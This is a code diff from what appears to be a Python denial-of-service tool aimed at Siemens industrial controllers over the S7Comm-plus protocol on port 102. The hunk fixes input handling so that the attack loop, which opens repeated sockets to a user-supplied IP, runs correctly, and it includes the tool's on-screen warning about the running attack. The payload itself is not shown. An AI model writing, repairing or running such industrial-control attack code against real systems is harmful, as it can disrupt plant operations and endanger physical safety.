@@ -116,8 +116,8 @@ if __name__ == "__main__":
             print("The only way to stop this attack is closing this programm or typing cntrl+C or waiting it to complete the iterations\n\n")
 
             IP = str(input('Please, type in the destination IP: '))
-            PORT = str(input('Please, type in the S7Comm-plus port (default is 102 for Siemens): '))
-            ITERS = str(input('Please, type in the the number of tries the denial of service will run (equals running time): '))
+            PORT = int(str(input('Please, type in the S7Comm-plus port (default is 102 for Siemens): ')))
+            ITERS = int(str(input('Please, type in the the number of tries the denial of service will run (equals running time): ')))
 
             for x in range(1,ITERS): 
                 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
